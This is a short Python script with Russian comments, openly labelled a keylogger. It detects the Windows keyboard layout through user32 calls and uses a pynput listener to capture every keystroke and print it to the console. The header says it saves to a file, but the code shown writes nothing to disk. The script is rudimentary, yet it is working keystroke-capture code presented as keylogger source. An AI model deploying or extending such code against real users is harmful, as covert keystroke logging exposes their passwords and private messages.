'''ФАЙЛ КОСТИН, ПО СОЗДАНИЮ КЕЙЛОГЕРА и сохранения в файл'''
from pynput import keyboard
import ctypes


class LangDetected:
    """Определение языка Раскладки Клавиатуры"""
    def keyboard_layaout(self):
        # хндл главного окна
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        # нить исполняемого данного окна ID
        nitya_id = ctypes.windll.user32.GetWindowThreadProcessId(hwnd, None)
        # хндл нити
        self.hndl_nit = ctypes.windll.user32.GetKeyboardLayout(nitya_id)

        # id языка
        lang_id = self.hndl_nit & 0xFFFF
        return lang_id

    def manifest_lang(self):
        lang_layaout = self.keyboard_layaout()

        # словарь кодов для раскладок
        dict_lang = {
            0x0409: "US",
            0x0419: "RU"
        }

        current_lang = dict_lang.get(lang_layaout, 'Error')

        if current_lang == 'US':
            lang_id = 0x0409
        elif current_lang == 'RU':
            lang_id = 0x0419
        else:
            return

        ctypes.windll.user32.ActivateKeyboardLayout(self.hndl_nit, lang_id)


class CreateKeyloger(LangDetected):
    """Кейлогер"""
    def on_press(seld, key):
        try:
            print(f'Нажата - {key.char}')
        except AttributeError:
            print(f'Нажата - {key}')

    def f(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()





l = LangDetected()
l.manifest_lang()

c = CreateKeyloger()
print(c.f())












